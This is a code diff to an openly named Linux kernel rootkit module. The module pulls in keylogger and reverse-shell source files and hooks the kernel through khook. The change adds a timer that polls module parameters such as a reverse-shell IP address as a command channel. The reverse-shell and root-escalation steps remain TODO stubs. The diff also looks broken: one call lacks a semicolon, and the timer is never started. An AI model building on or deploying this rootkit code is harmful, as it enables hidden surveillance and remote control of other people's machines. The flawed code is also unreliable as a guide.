@@ -7,6 +7,7 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/timer.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -75,18 +76,25 @@ static int khook_inode_permission(struct inode* inode, int mask) {
 //     // TODO
 // }
 
+static struct timer_list polling_timer;
+
+void set_new_timer(const unsigned int msecs) {
+    printk("Starting timer to fire in %u (%ld)\n", msecs, jiffies);
+    if (mod_timer(&polling_timer, jiffies + msecs_to_jiffies(msecs))) {
+        printk("Error setting timer.\n");
+    }
+}
+
 /**
- * Rootkit module initialization.
+ * Check all parameters against last-known values and see if anything changed.
+ * If yes, take the requested action.
+ * Finally, start a timer to call this function again in the future.
  */
-static int __init rootkit_init(void) {
-    printk(KERN_INFO "Initializing rootkit.\n");
-    khook_init();
-	
-    // Begin looping to check for changes in the variables.
-
-    printk(KERN_INFO "rev_shell_ip: %s\n", rev_shell_ip);
-
+void poll_for_commands() {
+    // TODO: Store previous values of variables somewhere.
+    printk(KERN_INFO "Polling for commands!\n");
     if (rev_shell_ip) {
+        printk(KERN_INFO "rev_shell_ip: %s\n", rev_shell_ip);
         // TODO: Set up reverse shell.
     }
 
@@ -98,6 +106,18 @@ static int __init rootkit_init(void) {
     //     get_root();
     // }
 
+    set_new_timer(300);
+}
+
+/**
+ * Rootkit module initialization.
+ */
+static int __init rootkit_init(void) {
+    printk(KERN_INFO "Initializing rootkit.\n");
+    printk(KERN_INFO "Initializing timer.\n");
+    khook_init();
+    // Set up timer to check for changes in the parameters, to detect commands being run.
+    setup_timer(&polling_timer, poll_for_commands, 0);
     return 0;
 }
 
@@ -107,6 +127,7 @@ static int __init rootkit_init(void) {
 static void __exit rootkit_exit(void) {
     printk(KERN_INFO "Cleaning up rootkit.\n");
     khook_cleanup();
+    del_timer(&polling_timer)
 }
 
 module_init(rootkit_init);
